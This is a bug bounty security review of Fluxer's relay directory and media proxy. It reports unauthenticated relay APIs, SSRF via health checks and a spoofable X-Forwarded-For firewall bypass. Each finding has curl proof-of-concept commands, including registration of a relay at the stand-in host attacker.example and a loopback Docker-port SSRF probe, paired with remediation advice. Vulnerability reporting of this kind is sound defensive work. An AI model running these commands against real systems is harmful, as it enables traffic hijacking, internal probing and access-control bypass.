# Bug Bounty Security Review (Fluxer)

## Scope
- `fluxer_relay_directory`
- `packages/media_proxy`

## Findings (Medium+)

### 1) Unauthenticated relay lifecycle APIs (High)
**Affected endpoints:**
- `POST /v1/relays/register`
- `POST /v1/relays/:id/heartbeat`
- `DELETE /v1/relays/:id`

**Why this is a vulnerability**
The relay directory exposes state-changing operations without any authentication or authorization checks. Any network client can register arbitrary relays, keep them alive with heartbeats, or delete existing relays.

**Impact**
- Unauthorized deletion of valid relays (availability impact).
- Injection of attacker-controlled relays into discovery results (integrity impact).
- Traffic steering to attacker infrastructure if clients consume the directory blindly.

**Code evidence**
The controller directly binds these routes and executes registry operations, with only schema validation and no auth middleware.

**PoC**
```bash
# 1) Register attacker relay
curl -sS -X POST http://TARGET:8080/v1/relays/register \
  -H 'content-type: application/json' \
  -d '{
    "name":"evil-relay",
    "url":"http://attacker.example",
    "latitude":37.7749,
    "longitude":-122.4194,
    "region":"us-west",
    "capacity":100000,
    "public_key":"ZmFrZV9rZXk="
  }'

# 2) Enumerate relays and collect victim relay ID
curl -sS http://TARGET:8080/v1/relays

# 3) Delete victim relay (no auth required)
curl -sS -X DELETE http://TARGET:8080/v1/relays/<relay_uuid>
```

**Remediation**
- Require strong service-to-service authentication (mTLS or signed bearer/JWT with audience checks) for all mutating relay endpoints.
- Add authorization policy: only trusted relay operators may mutate their own entries.
- Add audit logging and rate limiting for mutating paths.

---

### 2) SSRF via relay registration + periodic health checks (High)
**Affected flow:**
- `POST /v1/relays/register` accepts arbitrary `url`.
- Health checker periodically requests `new URL('/_health', relay.url)`.

**Why this is a vulnerability**
Because relay registration is unauthenticated and the URL is attacker-controlled, an attacker can register internal/private targets (e.g., `http://127.0.0.1:2375`, `http://169.254.169.254`) and force the directory service to send periodic requests to those destinations.

**Impact**
- Internal network/localhost probing from a privileged host.
- Potential metadata-service probing in cloud environments.
- Repeated request amplification via scheduler (`setInterval`) enabling continuous internal scanning.

**PoC**
```bash
# Register a relay pointing to localhost/internal endpoint
curl -sS -X POST http://TARGET:8080/v1/relays/register \
  -H 'content-type: application/json' \
  -d '{
    "name":"ssrf-probe",
    "url":"http://127.0.0.1:2375",
    "latitude":0,
    "longitude":0,
    "region":"local",
    "capacity":1,
    "public_key":"ZmFrZQ=="
  }'

# Wait one or more health-check intervals; observe outgoing requests on local/internal service logs.
```

**Remediation**
- Strictly allowlist relay hostnames/domains (or enforce ownership proof).
- Deny private, loopback, link-local, multicast, and RFC1918/reserved IP destinations after DNS resolution.
- Re-resolve and validate on each check to prevent DNS rebinding.
- Apply outbound egress firewall policy to block sensitive networks.

---

### 3) Cloudflare firewall bypass via spoofable `X-Forwarded-For` (High)
**Affected component:**
- `createCloudflareFirewall` in `packages/media_proxy`

**Why this is a vulnerability**
The firewall trusts the `X-Forwarded-For` header as the source IP and checks whether that value is in Cloudflare ranges. If the service is reachable directly (not strictly behind a trusted reverse proxy), an attacker can send a forged `X-Forwarded-For` with a Cloudflare IP and bypass the protection.

**Impact**
- Access-control bypass for routes intended to be Cloudflare-only.
- Exposure of expensive media-processing endpoints to direct abuse.

**PoC**
```bash
# Use a public Cloudflare edge IP in XFF to bypass naive check
curl -i http://TARGET:PORT/some/protected/path \
  -H 'X-Forwarded-For: 173.245.48.5'
```

**Remediation**
- Validate peer IP from trusted transport metadata (`socket.remoteAddress`/proxy chain from trusted hops), not directly from user-controlled headers.
- Only honor forwarding headers when request comes from explicitly trusted upstream proxies.
- Prefer Cloudflare-specific authenticated headers/mechanisms (e.g., Authenticated Origin Pulls) at the edge.

## Overall security assessment
Current posture is **moderate-to-high risk** for internet-exposed deployments, mainly due to missing authentication on control-plane APIs and trust of spoofable forwarding headers. The combination of unauthenticated registration and active health checking creates a practical SSRF primitive. Prioritize fixes for the three findings above before production exposure.
